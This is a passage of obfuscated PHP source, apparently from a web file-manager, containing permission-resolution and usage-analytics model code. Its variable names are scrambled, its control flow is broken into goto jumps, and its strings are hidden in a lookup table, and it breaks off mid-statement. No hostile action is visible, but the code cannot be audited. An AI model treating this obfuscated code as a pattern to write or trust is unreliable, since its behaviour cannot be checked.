(!$F†Šó•†·) { return !1; } $fÌ‹…ŠêÔ->groupPathDisplay($F†Šó•†·); $cïæàØÛè¨ = array($F†Šó•†·); goto bâÔ„ùÁ; Fù‚ÓöÃëÒ: } private function groupAuthInfo($e·Ç°Ü‹¥í, $A¼…Åİ²¬) { $bø¡Šñœ©è =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $FÇ¸¢Ïöêİ = Model($bø¡Šñœ©è[516])->getInfo($A¼…Åİ²¬); return array($bø¡Šñœ©è[1914] => intval($e·Ç°Ü‹¥í[$bø¡Šñœ©è[408]]), $bø¡Šñœ©è[1898] => $e·Ç°Ü‹¥í, $bø¡Šñœ©è[1915] => LNG($bø¡Šñœ©è[1916]), $bø¡Šñœ©è[1907] => array($bø¡Šñœ©è[415] => $FÇ¸¢Ïöêİ[$bø¡Šñœ©è[28]], $bø¡Šñœ©è[76] => KodIO::make($FÇ¸¢Ïöêİ[$bø¡Šñœ©è[85]][$bø¡Šñœ©è[397]]), $bø¡Šñœ©è[1913] => $FÇ¸¢Ïöêİ[$bø¡Šñœ©è[520]])); } protected function groupRootAuth($f‡‚òãßíŒ, $E³ññŒâ˜” = false) { goto E¤ÉâàĞ‰; c£É¢¾³ªÂ: $d‰‘¢©Çöò = $this->sourceAuthSelect($fï¤ñŞ‡Ñ°[$E©©ÚÎ†à[85]][$E©©ÚÎ†à[397]]); $CÊß˜ò­®ƒ = $d‰‘¢©Çöò ? $this->authMake($d‰‘¢©Çöò, $E³ññŒâ˜”) : !1; $bìÊæ¨Ñ»‘ = $CÊß˜ò­®ƒ ? $CÊß˜ò­®ƒ[$E©©ÚÎ†à[460]] : !1; goto aŸ˜™Øœ‘Ÿ; aÊ’°çË«¿: static $a‚Ã»óéÚø = array(); if (isset($a‚Ã»óéÚø[$A™ô„ŒÅê])) { return $a‚Ã»óéÚø[$A™ô„ŒÅê]; } $fï¤ñŞ‡Ñ° = Model($E©©ÚÎ†à[516])->getInfo($f‡‚òãßíŒ); goto bé³ä»†è¢; E¤ÉâàĞ‰: $E©©ÚÎ†à =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $E³ññŒâ˜” = $E³ññŒâ˜” ? $E³ññŒâ˜” : USER_ID; $A™ô„ŒÅê = $E³ññŒâ˜” . $E©©ÚÎ†à[1917] . $f‡‚òãßíŒ; goto aÊ’°çË«¿; aŸ˜™Øœ‘Ÿ: $a‚Ã»óéÚø[$A™ô„ŒÅê] = $bìÊæ¨Ñ»‘ ? $bìÊæ¨Ñ»‘ : $A³ñÌ‰ğ‰Ó; return $a‚Ã»óéÚø[$A™ô„ŒÅê]; goto fÀ¸§·šÊÔ; bé³ä»†è¢: $E÷ê’ğµ„¼ = $this->userGroupList($E³ññŒâ˜”); $A³ñÌ‰ğ‰Ó = isset($E÷ê’ğµ„¼[$f‡‚òãßíŒ]) ? $E÷ê’ğµ„¼[$f‡‚òãßíŒ][$E©©ÚÎ†à[408]] : !1; if ($A³ñÌ‰ğ‰Ó && Model($E©©ÚÎ†à[501])->authCheckAction($A³ñÌ‰ğ‰Ó[$E©©ÚÎ†à[408]], $E©©ÚÎ†à[1739])) { $a‚Ã»óéÚø[$A™ô„ŒÅê] = $A³ñÌ‰ğ‰Ó; return $A³ñÌ‰ğ‰Ó; } goto c£É¢¾³ªÂ; fÀ¸§·šÊÔ: } public function authOwnerApply($BÅÃ‚ªÏ¼) { goto C¾­İùô¸; E¡²„÷Ú´: if (count($aÉ®óñŸÍ) == 0) { $aÉ®óñŸÍ = $this->authFolderOwnerGroup($BÅÃ‚ªÏ¼[$B‚§ ¨¸¶[498]]); } $aÉ®óñŸÍ = array_unique($aÉ®óñŸÍ); if (AuthModel::authCheckRoot($BÅÃ‚ªÏ¼[$B‚§ ¨¸¶[408]][$B‚§ ¨¸¶[409]])) { $aÉ®óñŸÍ[] = USER_ID; } goto cï›¶„ãÜÍ; cï›¶„ãÜÍ: $BÅÃ‚ªÏ¼[$B‚§ ¨¸¶[408]][$B‚§ ¨¸¶[1920]] = Model($B‚§ ¨¸¶[507])->userListInfo($aÉ®óñŸÍ); return $BÅÃ‚ªÏ¼; goto añá«ùªÛ†; CÚ¿Ì·„Â„: $F¿¶Áˆñ«Ù = array(); $aÉ®óñŸÍ = array(); foreach ($B…ÖÄÓ¿Î as $Fìùá¡ˆ÷¡ => $aäÈ¸İÓ‡Ş) { $EÌ£Ê°Šª˜ = $this->authFolderOwnerUser($aäÈ¸İÓ‡Ş); $F¿¶Áˆñ«Ù[$Fìùá¡ˆ÷¡] = $EÌ£Ê°Šª˜; $aÉ®óñŸÍ = array_merge($aÉ®óñŸÍ, $EÌ£Ê°Šª˜[$B‚§ ¨¸¶[588]]); if ($EÌ£Ê°Šª˜[$B‚§ ¨¸¶[1919]]) { break; } } goto E¡²„÷Ú´; C¾­İùô¸: $B‚§ ¨¸¶ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (empty($BÅÃ‚ªÏ¼[$B‚§ ¨¸¶[408]]) || isset($BÅÃ‚ªÏ¼[$B‚§ ¨¸¶[1918]]) && $BÅÃ‚ªÏ¼[$B‚§ ¨¸¶[1918]]) { return $BÅÃ‚ªÏ¼; } if (AuthModel::authCheckRoot($BÅÃ‚ªÏ¼[$B‚§ ¨¸¶[408]][$B‚§ ¨¸¶[409]])) { return $BÅÃ‚ªÏ¼; } goto d¸¡»„¯ù; d¸¡»„¯ù: $F„ñ®ˆ´¢ß = Model($B‚§ ¨¸¶[1227])->parentLevelArray($BÅÃ‚ªÏ¼[$B‚§ ¨¸¶[515]]); $F„ñ®ˆ´¢ß = array_merge(array($BÅÃ‚ªÏ¼[$B‚§ ¨¸¶[397]]), array_reverse($F„ñ®ˆ´¢ß)); $B…ÖÄÓ¿Î = $this->sourceAuthSelect($F„ñ®ˆ´¢ß); goto CÚ¿Ì·„Â„; añá«ùªÛ†: } private function authFolderOwnerGroup($bÕâºË‚‡ò) { $B½×‚±èÍ› =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $b›†·áåºÑ = Model($B½×‚±èÍ›[1805])->where(array($B½×‚±èÍ›[1719] => $bÕâºË‚‡ò))->select(); $c¶È£ô¹äÓ = array(); if (!$b›†·áåºÑ) { return $c¶È£ô¹äÓ; } foreach ($b›†·áåºÑ as $AÄƒóÚÖÀÅ) { $e„ì°˜×æ¦ = $this->authInfo($AÄƒóÚÖÀÅ); if (AuthModel::authCheckRoot($e„ì°˜×æ¦[$B½×‚±èÍ›[408]])) { $c¶È£ô¹äÓ[] = $AÄƒóÚÖÀÅ[$B½×‚±èÍ›[1550]]; } } return $c¶È£ô¹äÓ; } private function authFolderOwnerUser($eÔÊé©²¤») { $D¨ÂÂ…¼Õ¹ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $A×¿©Àó± = array(); $cÈ¬éãÙøÃ = !1; foreach ($eÔÊé©²¤» as $d¯Ê°âà¢Ô) { $cƒÜˆîÑİ = $this->authInfo($d¯Ê°âà¢Ô); if ($d¯Ê°âà¢Ô[$D¨ÂÂ…¼Õ¹[498]] == $D¨ÂÂ…¼Õ¹[191]) { $cÈ¬éãÙøÃ = !0; } if ($d¯Ê°âà¢Ô[$D¨ÂÂ…¼Õ¹[406]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($cƒÜˆîÑİ[$D¨ÂÂ…¼Õ¹[408]])) { $A×¿©Àó±[] = $d¯Ê°âà¢Ô[$D¨ÂÂ…¼Õ¹[498]]; } } } return array($D¨ÂÂ…¼Õ¹[588] => $A×¿©Àó±, $D¨ÂÂ…¼Õ¹[1919] => $cÈ¬éãÙøÃ); } public function authMake($A– á¦øá, $f–š» †ó˜ = false) { $f£–Ñ Î…Š =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $FÏ±»›¡Ğï = $this->authArrayCheck($A– á¦øá, $f–š» †ó˜); if ($FÏ±»›¡Ğï[$f£–Ñ Î…Š[1921]]) { $FÏ±»›¡Ğï[$f£–Ñ Î…Š[1921]] = $this->sourceAuthInfo($FÏ±»›¡Ğï[$f£–Ñ Î…Š[1921]]); } return $FÏ±»›¡Ğï; } public function authArrayCheck($A”ÒƒÜ“è, $C¿Ó¾›„«± = false) { goto F™ÍŒœ«Ï‚; a¬“ï×ÚÉ²: $a¢²èó—±· = 1000; $EÅ‹ã˜©ñŸ = 0; $cóÅÚŠ²ºô = 0; goto aóÖ‹Â²„¯; aóÖ‹Â²„¯: $cˆìµ»‡çà = 0; $Aé’¸ĞÍÜ = 0; $a°‰ìàŒ­Å = array($C÷òéÃÏŞ•[397] => 0); goto FÏĞÂ•®¡Ã; fİ¶ªô ß–: $d‘ŠŸ…àĞ× = 0; $b›¾›Î´Î = 0; $cĞÑ‚¦„Ç = 0; goto bÚ„¶ÎÊÙ£; FÏĞÂ•®¡Ã: foreach ($A”ÒƒÜ“è as $a°‰ìàŒ­Å) { $AÅŠä¦á = $this->authInfo($a°‰ìàŒ­Å); if (!$AÅŠä¦á) { continue; } $Fô–„ìæÍã = $a°‰ìàŒ­Å[$C÷òéÃÏŞ•[498]]; $aƒÅÖ¥¿Š” = intval($AÅŠä¦á[$C÷òéÃÏŞ•[408]]); if ($a°‰ìàŒ­Å[$C÷òéÃÏŞ•[406]] == SourceModel::TYPE_USER && $Fô–„ìæÍã == $C¿Ó¾›„«±) { $d‘ŠŸ…àĞ× = !0; $cĞÑ‚¦„Ç = $AÅŠä¦á; $b›¾›Î´Î = $aƒÅÖ¥¿Š”; } else { if ($a°‰ìàŒ­Å[$C÷òéÃÏŞ•[406]] == SourceModel::TYPE_GROUP && $this->groupContainUser($Fô–„ìæÍã, $C¿Ó¾›„«±)) { $fÑ”ùÚ¼ã = !0; $bÆ£—½Ö”¸ = $this->groupStepToUserGroup($Fô–„ìæÍã, $C¿Ó¾›„«±); if ($bÆ£—½Ö”¸ < $a¢²èó—±·) { $a¢²èó—±· = $bÆ£—½Ö”¸; $EÖÁÍèÔ» = $aƒÅÖ¥¿Š”; $Få‰† ¦… = $AÅŠä¦á; $EÅ‹ã˜©ñŸ = $Fô–„ìæÍã; } if ($bÆ£—½Ö”¸ == $a¢²èó—±· && $aƒÅÖ¥¿Š” >= $EÖÁÍèÔ») { $EÖÁÍèÔ» = $aƒÅÖ¥¿Š”; $Få‰† ¦… = $AÅŠä¦á; $EÅ‹ã˜©ñŸ = $Fô–„ìæÍã; } } else { if ($Fô–„ìæÍã == $C÷òéÃÏŞ•[191]) { $cóÅÚŠ²ºô = !0; $Aé’¸ĞÍÜ = $AÅŠä¦á; $cˆìµ»‡çà = $aƒÅÖ¥¿Š”; } } } } if ($d‘ŠŸ…àĞ×) { $EÓò¦ÉÛø¾ = $b›¾›Î´Î; $AÅŠä¦á = $cĞÑ‚¦„Ç; $E„†éğ· = LNG($C÷òéÃÏŞ•[1922]); } else { if ($fÑ”ùÚ¼ã) { $EÓò¦ÉÛø¾ = $EÖÁÍèÔ»; $AÅŠä¦á = $Få‰† ¦…; $cºÂñĞºÎ² = Model($C÷òéÃÏŞ•[516])->getInfo($EÅ‹ã˜©ñŸ); $E„†éğ· = $C÷òéÃÏŞ•[160] . $cºÂñĞºÎ²[$C÷òéÃÏŞ•[520]] . $C÷òéÃÏŞ•[1923] . LNG($C÷òéÃÏŞ•[1924]); } else { if ($cóÅÚŠ²ºô) { $EÓò¦ÉÛø¾ = $cˆìµ»‡çà; $AÅŠä¦á = $Aé’¸ĞÍÜ; $E„†éğ· = LNG($C÷òéÃÏŞ•[1895]); } else { $EÓò¦ÉÛø¾ = 0; $AÅŠä¦á = !1; $E„†éğ· = $C÷òéÃÏŞ•[33]; } } } $dœÅšÖòÁ = array($C÷òéÃÏŞ•[1914] => intval($EÓò¦ÉÛø¾), $C÷òéÃÏŞ•[1898] => $AÅŠä¦á, $C÷òéÃÏŞ•[1915] => $E„†éğ·, $C÷òéÃÏŞ•[1907] => $a°‰ìàŒ­Å[$C÷òéÃÏŞ•[397]]); goto E¼µ…„àÛÆ; bÚ„¶ÎÊÙ£: $fÑ”ùÚ¼ã = 0; $EÖÁÍèÔ» = 0; $Få‰† ¦… = 0; goto a¬“ï×ÚÉ²; E¼µ…„àÛÆ: return $dœÅšÖòÁ; goto Fƒ”ó¸Ö–³; F™ÍŒœ«Ï‚: $C÷òéÃÏŞ• =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!$A”ÒƒÜ“è) { return array($C÷òéÃÏŞ•[409] => 0, $C÷òéÃÏŞ•[460] => !1); } $C¿Ó¾›„«± = $C¿Ó¾›„«± ? $C¿Ó¾›„«± : USER_ID; goto fİ¶ªô ß–; Fƒ”ó¸Ö–³: } private function groupContainUser($fŒ¥ßŞñ†á, $dÌÌ±Ç¡½¢ = false) { return in_array($fŒ¥ßŞñ†á, $this->userGroupParents($dÌÌ±Ç¡½¢)); } private function groupStepToUserGroup($d¦ç÷Æˆ¯, $aƒïÅÓñµ = false) { goto d ÍÙšéóİ; aĞŠĞÂ–èè: return $DÕ‚éä‰¥¨; goto a…¤ÓÓÎğ¿; d ÍÙšéóİ: $eİÊ÷¿Ò¥ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $dèøÅÌ‚½ = $this->userGroupList($aƒïÅÓñµ); $DÕ‚éä‰¥¨ = 1000; goto eÕ¹Ïç•; eÕ¹Ïç•: $A¯¨¼ôº‘ = $GLOBALS[$eİÊ÷¿Ò¥[6]][$eİÊ÷¿Ò¥[88]][$eİÊ÷¿Ò¥[1816]] == 1; $e™ŸÁ£¨ĞÊ = $A¯¨¼ôº‘ ? 3 : 2; foreach ($dèøÅÌ‚½ as $F½åÍ¬öËÊ) { if ($F½åÍ¬öËÊ[$eİÊ÷¿Ò¥[1719]] == $d¦ç÷Æˆ¯) { return 0; } $EÈï®»¡ÓŠ = explode($eİÊ÷¿Ò¥[47], trim($F½åÍ¬öËÊ[$eİÊ÷¿Ò¥[515]], $eİÊ÷¿Ò¥[47])); if ($EÈï®»¡ÓŠ[0] == $eİÊ÷¿Ò¥[191] && count($EÈï®»¡ÓŠ) > $e™ŸÁ£¨ĞÊ) { $E¿ß‚×âÄ = array_reverse(array_slice($EÈï®»¡ÓŠ, $e™ŸÁ£¨ĞÊ)); $bÎó‘ó¨²­ = array_search($d¦ç÷Æˆ¯, $E¿ß‚×âÄ); if ($bÎó‘ó¨²­ !== !1 && $bÎó‘ó¨²­ + 1 <= $DÕ‚éä‰¥¨) { $DÕ‚éä‰¥¨ = $bÎó‘ó¨²­ + 1; } } } goto aĞŠĞÂ–èè; a…¤ÓÓÎğ¿: } private function userGroupList($f¿±ó¸›˜› = false) { $D Ì×¢Ñ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; static $c”ø¤À»À = array(); if (isset($c”ø¤À»À[$f¿±ó¸›˜›])) { return $c”ø¤À»À[$f¿±ó¸›˜›]; } $CÍ‹¨çÉ® = Model($D Ì×¢Ñ[532])->getInfo($f¿±ó¸›˜›); $c”ø¤À»À[$f¿±ó¸›˜›] = array_to_keyvalue($CÍ‹¨çÉ®[$D Ì×¢Ñ[1896]], $D Ì×¢Ñ[1719]); return $c”ø¤À»À[$f¿±ó¸›˜›]; } public function userGroupParents($DÀË…–²á) { goto B¬ÛåŒÇ›É; B¬ÛåŒÇ›É: $c°ÓçÓ‘é‰ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; static $cÏ¤¾¼»óö = array(); $DÀË…–²á = $DÀË…–²á ? $DÀË…–²á : USER_ID; goto b‰èªÃ¥Š; b‰èªÃ¥Š: if (isset($cÏ¤¾¼»óö[$DÀË…–²á])) { return $cÏ¤¾¼»óö[$DÀË…–²á]; } $fŠÈ‘†ã´Ğ = $this->userGroupList($DÀË…–²á); $CÑ‹áí©â = array(); goto a©®ˆ¿İ; b…ÑŒà¶ƒ‡: $cÏ¤¾¼»óö[$DÀË…–²á] = array_unique($CÑ‹áí©â); return $cÏ¤¾¼»óö[$DÀË…–²á]; goto aÎ“èÌÁšÜ; a©®ˆ¿İ: $CŒÓØ“†° = $GLOBALS[$c°ÓçÓ‘é‰[6]][$c°ÓçÓ‘é‰[88]][$c°ÓçÓ‘é‰[1816]] == 1; $AÓì¶‹ÍÂ = $CŒÓØ“†° ? 3 : 2; foreach ($fŠÈ‘†ã´Ğ as $aõÕ’ÛÈËê) { $F¼Ìø´àâ¼ = array($aõÕ’ÛÈËê[$c°ÓçÓ‘é‰[1719]]); $DõÊáÄ˜ƒİ = explode($c°ÓçÓ‘é‰[47], trim($aõÕ’ÛÈËê[$c°ÓçÓ‘é‰[515]], $c°ÓçÓ‘é‰[47])); if ($DõÊáÄ˜ƒİ[0] == $c°ÓçÓ‘é‰[191] && count($DõÊáÄ˜ƒİ) > $AÓì¶‹ÍÂ) { $DîæíÛòòŒ = array_slice($DõÊáÄ˜ƒİ, $AÓì¶‹ÍÂ); $F¼Ìø´àâ¼ = array_merge($F¼Ìø´àâ¼, array_reverse($DîæíÛòòŒ)); } $CÑ‹áí©â = array_merge($CÑ‹áí©â, $F¼Ìø´àâ¼); } goto b…ÑŒà¶ƒ‡; aÎ“èÌÁšÜ: } public function authTargetInfoMake($C«¾àôÍ¯Ü) { goto aÆÑ¯—à; F¥¤­Üµ¬¯: return array($f˜ÉÑƒË°í[1926] => $Cğ™èª¦¥», $f˜ÉÑƒË°í[1927] => $dÏµêÎîˆ); goto b­Ğìæ; EÂñèãôİ§: foreach ($C«¾àôÍ¯Ü as $cŒæ¿Œˆ’”) { if ($cŒæ¿Œˆ’”[$f˜ÉÑƒË°í[406]] == SourceModel::TYPE_USER) { $Cğ™èª¦¥»[] = intval($cŒæ¿Œˆ’”[$f˜ÉÑƒË°í[498]]); } else { if ($cŒæ¿Œˆ’”[$f˜ÉÑƒË°í[406]] == SourceModel::TYPE_GROUP) { $dÏµêÎîˆ[] = intval($cŒæ¿Œˆ’”[$f˜ÉÑƒË°í[498]]); } } } if ($Cğ™èª¦¥») { $Cğ™èª¦¥» = Model($f˜ÉÑƒË°í[507])->userListInfo($Cğ™èª¦¥»); } if ($dÏµêÎîˆ) { $c˜Ü¤Ğ·Ä‚ = array($f˜ÉÑƒË°í[1803] => array($f˜ÉÑƒË°í[413], $dÏµêÎîˆ)); $dÏµêÎîˆ = Model($f˜ÉÑƒË°í[516])->field($f˜ÉÑƒË°í[1925])->where($c˜Ü¤Ğ·Ä‚)->select(); $dÏµêÎîˆ = array_to_keyvalue($dÏµêÎîˆ, $f˜ÉÑƒË°í[1719]); } goto F¥¤­Üµ¬¯; aÆÑ¯—à: $f˜ÉÑƒË°í =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $Cğ™èª¦¥» = array(); $dÏµêÎîˆ = array(); goto EÂñèãôİ§; b­Ğìæ: } public function authInfo($EŠ‚’ÚœÊÕ) { $fÔ˜ö£Â­° =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if ($EŠ‚’ÚœÊÕ[$fÔ˜ö£Â­°[1819]]) { $bÈ¦¢î  = Model($fÔ˜ö£Â­°[501])->listData($EŠ‚’ÚœÊÕ[$fÔ˜ö£Â­°[1819]]); if (!$bÈ¦¢î ) { return !1; $d×»ÏîŒ© = Model($fÔ˜ö£Â­°[501])->listData(); $AÚõ¡“éâ = array_filter_by_field($d×»ÏîŒ©, $fÔ˜ö£Â­°[408], $fÔ˜ö£Â­°[191]); return $AÚõ¡“éâ; } $C¨İø©¢ŠÚ = array_field_key($bÈ¦¢î , array($fÔ˜ö£Â­°[395], $fÔ˜ö£Â­°[28], $fÔ˜ö£Â­°[408], $fÔ˜ö£Â­°[1741], $fÔ˜ö£Â­°[1742])); $C¨İø©¢ŠÚ[$fÔ˜ö£Â­°[1928]] = $EŠ‚’ÚœÊÕ; return $C¨İø©¢ŠÚ; } else { return array($fÔ˜ö£Â­°[414] => 0, $fÔ˜ö£Â­°[1725] => $EŠ‚’ÚœÊÕ[$fÔ˜ö£Â­°[1873]], $fÔ˜ö£Â­°[415] => $fÔ˜ö£Â­°[33], $fÔ˜ö£Â­°[1741] => $fÔ˜ö£Â­°[1929]); } } } goto eïóÎ¸ »ˆ; aÁÉ¢„ÙÌÈ: class AnalysisModel extends ModelBaseLight { public function init($bêèÇ¼ÓÇ) { $e›å­Ğ††Ö =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $CŠóÙëê¿î = array($e›å­Ğ††Ö[588] => array($e›å­Ğ††Ö[29] => $e›å­Ğ††Ö[1645], $e›å­Ğ††Ö[271] => array($e›å­Ğ††Ö[222], $e›å­Ğ††Ö[746], $e›å­Ğ††Ö[1646], $e›å­Ğ††Ö[1647])), $e›å­Ğ††Ö[1648] => array($e›å­Ğ††Ö[29] => $e›å­Ğ††Ö[1649], $e›å­Ğ††Ö[271] => array($e›å­Ğ††Ö[222], $e›å­Ğ††Ö[744], $e›å­Ğ††Ö[1650], $e›å­Ğ††Ö[1651], $e›å­Ğ††Ö[1652]))); if (!isset($CŠóÙëê¿î[$bêèÇ¼ÓÇ])) { return !1; } $this->optionType = $CŠóÙëê¿î[$bêèÇ¼ÓÇ][$e›å­Ğ††Ö[29]]; $this->field = $CŠóÙëê¿î[$bêèÇ¼ÓÇ][$e›å­Ğ††Ö[271]]; return !0; } public function listData($B«ôÙŠ´§ = false, $cÔÊ­–ÎòŞ = "\x6d\x6f\x64\x69\x66\171\124\151\155\145", $b“‡ë§İàÆ = false) { return parent::listData($B«ôÙŠ´§, $cÔÊ­–ÎòŞ, $b“‡ë§İàÆ); } public function trendList($e‰ïÃŠé†) { goto eŸ¬ÕÖÙ‚; eŸ¬ÕÖÙ‚: $e–¶øÌ‘ï· =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $C×²ËÆ´ë = $this->listData(); if ($C×²ËÆ´ë) { $a¢Íé‡‰Í² = end($C×²ËÆ´ë); $AŒÙèŸ˜½ = date($e–¶øÌ‘ï·[1653], strtotime($e–¶øÌ‘ï·[1654])); if ($a¢Íé‡‰Í²[$e–¶øÌ‘ï·[222]] == $AŒÙèŸ˜½) { return $C×²ËÆ´ë; } $Cçš¨«˜ºö = strtotime($a¢Íé‡‰Í²[$e–¶øÌ‘ï·[222]]); } goto e‡æÜÂ˜; e‡æÜÂ˜: if (!isset($Cçš¨«˜ºö)) { $b—ŠÛ¥Ïİ‡ = $e‰ïÃŠé† == $e–¶øÌ‘ï·[588] ? $e–¶øÌ‘ï·[532] : $e–¶øÌ‘ï·[813]; $Cçš¨«˜ºö = Model($b—ŠÛ¥Ïİ‡)->min($e–¶øÌ‘ï·[194]); } $F¦‚íôí¥„ = $e–¶øÌ‘ï·[1655] . ucfirst($e‰ïÃŠé†); $DÏâš»è³‹ = $this->dateList($Cçš¨«˜ºö); goto eØ¾Áé‰†¦; eØ¾Áé‰†¦: foreach ($DÏâš»è³‹ as $AŒÙèŸ˜½) { $this->{$F¦‚íôí¥„}($AŒÙèŸ˜½); } return $this->listData(); goto aÒ…§ŞÌ; aÒ…§ŞÌ: } private function dateList($AæóÓİ¹Æ—) { $aŞø˜µŠ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $aÁô£Ùá§¡ = $AæóÓİ¹Æ—; $A „œÀÁø‘ = strtotime($aŞø˜µŠ[1654]); $eƒôŒ„¨øƒ = array(); while ($aÁô£Ùá§¡ <= $A „œÀÁø‘) { $eƒôŒ„¨øƒ[] = date($aŞø˜µŠ[1653], $aÁô£Ùá§¡); $aÁô£Ùá§¡ = strtotime($aŞø˜µŠ[1656], $aÁô£Ùá§¡); } return $eƒôŒ„¨øƒ; } public function _recordUser($EÓæŸµóÈŒ = '') { goto cß¤¢Ë°¡; c‰¡¾‚£Ê: $a—øç„âÄ³ = array($DìÇ‘˜ƒ©[194] => array($DìÇ‘˜ƒ©[993], $ağˆ¦÷„¤­)); $böÑÛ¦àõ = Model($DìÇ‘˜ƒ©[532])->where($a—øç„âÄ³)->count($DìÇ‘˜ƒ©[1550]); $a—øç„âÄ³[$DìÇ‘˜ƒ©[194]] = array($DìÇ‘˜ƒ©[331], array($E²ÜÂÀÎªÎ, $ağˆ¦÷„¤­)); goto C× §ˆË¼; Fè´«Ÿé‚: $E‰×¿åàË = array($DìÇ‘˜ƒ©[222] => $EÓæŸµóÈŒ, $DìÇ‘˜ƒ©[746] => (int) $böÑÛ¦àõ, $DìÇ‘˜ƒ©[1646] => (int) $B¡öµ½âÆ, $DìÇ‘˜ƒ©[1647] => (int) $F‹»‰ä„Â¦); return $this->insert($E‰×¿åàË); goto eä¢Ş†ç“¯; C× §ˆË¼: $B¡öµ½âÆ = Model($DìÇ‘˜ƒ©[532])->where($a—øç„âÄ³)->count($DìÇ‘˜ƒ©[1550]); $a—øç„âÄ³[$DìÇ‘˜ƒ©[29]] = $DìÇ‘˜ƒ©[1659]; $F‹»‰ä„Â¦ = Model($DìÇ‘˜ƒ©[1660])->where($a—øç„âÄ³)->count($DìÇ‘˜ƒ©[1661]); goto Fè´«Ÿé‚; cß¤¢Ë°¡: $DìÇ‘˜ƒ© =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $E²ÜÂÀÎªÎ = strtotime(date($DìÇ‘˜ƒ©[1657], strtotime($EÓæŸµóÈŒ))); $ağˆ¦÷„¤­ = strtotime(date($DìÇ‘˜ƒ©[1658], strtotime($EÓæŸµóÈŒ))); goto c‰¡¾‚£Ê; eä¢Ş†ç“¯: } public function _recordStore($A¥×Â¹–æ“ = '') { goto b°º»‹ğæ; AØÉí”ÚÚÒ: $D²¥¬èà²„ = Model($CÉó°‰Ç[464])->where($Eò›Ÿòô÷)->sum($CÉó°‰Ç[78]); $Eò›Ÿòô÷[$CÉó°‰Ç[405]] = 0; $Eœ°æÊš´ = Model($CÉó°‰Ç[813])->where($Eò›Ÿòô÷)->sum($CÉó°‰Ç[78]); goto AäÕåŞº›Ô; AäÕåŞº›Ô: $Eò›Ÿòô÷[$CÉó°‰Ç[406]] = 1; $e½Ğ²‰¶À› = Model($CÉó°‰Ç[813])->where($Eò›Ÿòô÷)->sum($CÉó°‰Ç[78]); $Eò›Ÿòô÷[$CÉó°‰Ç[406]] = 2; goto f½çãÙ¦ë¹; f½çãÙ¦ë¹: $D¸ÒÆ¾©Ê× = Model($CÉó°‰Ç[813])->where($Eò›Ÿòô÷)->sum($CÉó°‰Ç[78]); $aŒø”´ùÒÁ = array($CÉó°‰Ç[222] => $A¥×Â¹–æ“, $CÉó°‰Ç[744] => (int) $Eœ°æÊš´, $CÉó°‰Ç[1650] => (int) $D²¥¬èà²„, $CÉó°‰Ç[1651] => (int) $e½Ğ²‰¶À›, $CÉó°‰Ç[1652] => (int) $D¸ÒÆ¾©Ê×); return $this->insert($aŒø”´ùÒÁ); goto C·³Ÿ¥ËÑŞ; b°º»‹ğæ: $CÉó°‰Ç =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $EØ‡µ’ˆ®š = strtotime(date($CÉó°‰Ç[1658], strtotime($A¥×Â¹–æ“))); $Eò›Ÿòô÷ = array($CÉó°‰Ç[194] => array($CÉó°‰Ç[993], $EØ‡µ’ˆ®š)); goto AØÉí”ÚÚÒ; C·³Ÿ¥ËÑŞ: } public function trend($eğ·×çËô¡, $BŞË»­¨) { goto A£œºò¶Ô ; b¹…Ù°¶Û´: if ($B¸Å¯™Â¹ö && $BŞË»­¨ != $b„§æãÆô‹[1523]) { $B ª†È°â = $B¸Å¯™Â¹ö[0][$b„§æãÆô‹[222]]; $dê•ëÄŞó = $this->validDate($BŞË»­¨, $B ª†È°â); $aÜòõ„¥¸ = array(); $e¼Ëèº±­‡ = array_to_keyvalue($B¸Å¯™Â¹ö, $b„§æãÆô‹[222]); foreach ($dê•ëÄŞó as $fÆÇß·‡ì×) { if (isset($e¼Ëèº±­‡[$fÆÇß·‡ì×])) { $F‡†áóÍ¹ = $e¼Ëèº±­‡[$fÆÇß·‡ì×]; } else { $F‡†áóÍ¹ = end($B¸Å¯™Â¹ö); $F‡†áóÍ¹[$b„§æãÆô‹[222]] = $fÆÇß·‡ì×; if ($eğ·×çËô¡ == $b„§æãÆô‹[588]) { $F‡†áóÍ¹[$b„§æãÆô‹[1646]] = $F‡†áóÍ¹[$b„§æãÆô‹[1647]] = 0; } } $aÜòõ„¥¸[] = $F‡†áóÍ¹; } $B¸Å¯™Â¹ö = $aÜòõ„¥¸; } $C—öÎšÈŠç = array($b„§æãÆô‹[588] => array($b„§æãÆô‹[746] => LNG($b„§æãÆô‹[1662]), $b„§æãÆô‹[1646] => LNG($b„§æãÆô‹[1663]), $b„§æãÆô‹[1647] => LNG($b„§æãÆô‹[1664])), $b„§æãÆô‹[1648] => array($b„§æãÆô‹[744] => LNG($b„§æãÆô‹[1665]), $b„§æãÆô‹[1650] => LNG($b„§æãÆô‹[1666]), $b„§æãÆô‹[1651] => LNG($b„§æãÆô‹[1667]), $b„§æãÆô‹[1652] => LNG($b„§æãÆô‹[1668]))); $dÖ ˆŠïè” = array($b„§æãÆô‹[588] => $b„§æãÆô‹[1669], $b„§æãÆô‹[1648] => $b„§æãÆô‹[78]); goto BçêÔÅ™È–; A£œºò¶Ô : $b„§æãÆô‹ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; if (!$this->init($eğ·×çËô¡)) { return !1; } $B¸Å¯™Â¹ö = $this->trendList($eğ·×çËô¡); goto b¹…Ù°¶Û´; fˆÙÚ‰ÕÖ: return $FÙ¬ëñÁµ; goto EÌ¬÷¸ó×†; BçêÔÅ™È–: if (empty($B¸Å¯™Â¹ö)) { $fÆÇß·‡ì× = date($b„§æãÆô‹[1653], strtotime($b„§æãÆô‹[1654])); $b·ºíÄŒ¨³ = array($b„§æãÆô‹[222] => $fÆÇß·‡ì×); foreach 